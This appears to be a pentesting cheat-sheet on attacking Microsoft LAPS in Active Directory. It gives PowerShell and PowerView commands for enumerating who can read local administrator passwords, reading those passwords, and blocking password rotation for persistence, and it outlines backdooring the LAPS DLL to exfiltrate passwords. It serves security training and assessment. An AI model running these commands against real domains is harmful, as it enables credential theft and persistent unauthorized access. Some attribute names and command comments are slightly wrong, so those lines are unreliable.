## Basic Information

**LAPS** allows you to **manage the local Administrator password** (which is **randomised**, unique, and **changed regularly**) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.

When using LAPS, **2 new attributes** appear in the **computer** objects of the domain: **`ms-msc-AdmPwd`** and **`ms-mcs-AdmPwdExpirationTime`**_._ These attributes contains the **plain-text admin password and the expiration time**. Then, in a domain environment, it could be interesting to check **which users can read** these attributes.

### Check if activated

```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```

### LAPS Password Access

You could **download the raw LAPS policy** from `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` and then use **`Parse-PolFile`** from the [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.

Moreover, the **native LAPS PowerShell cmdlets** can be used if they're installed on a machine we have access to:

```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

**PowerView** can also be used to find out **who can read the password and read it**:

```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```

### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilitates the enumeration of LAPS this with several functions.\
One is parsing **`ExtendedRights`** for **all computers with LAPS enabled.** This will show **groups** specifically **delegated to read LAPS passwords**, which are often users in protected groups.\
An **account** that has **joined a computer** to a domain receives `All Extended Rights` over that host, and this right gives the **account** the ability to **read passwords**. Enumeration may show a user account that can read the LAPS password on a host. This can help us **target specific AD users** who can read LAPS passwords.

```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```

## **LAPS Persistence**

### **Expiration Date**

Once admin, it's possible to **obtain the passwords** and **prevent** a machine from **updating** its **password** by **setting the expiration date into the future**.

```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

{% hint style="warning" %}
The password will still reset if an **admin** uses the **`Reset-AdmPwdPassword`** cmdlet; or if **Do not allow password expiration time longer than required by policy** is enabled in the LAPS GPO.
{% endhint %}

### Backdoor

The original source code for LAPS can be found [here](https://github.com/GreyCorbel/admpwd), therefore it's possible to put a backdoor in the code (inside the `Get-AdmPwdPassword` method in `Main/AdmPwd.PS/Main.cs` for example) that will somehow **exfiltrate new passwords or store them somewhere**.

Then, just compile the new `AdmPwd.PS.dll` and upload it to the machine in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (and change the modification time).
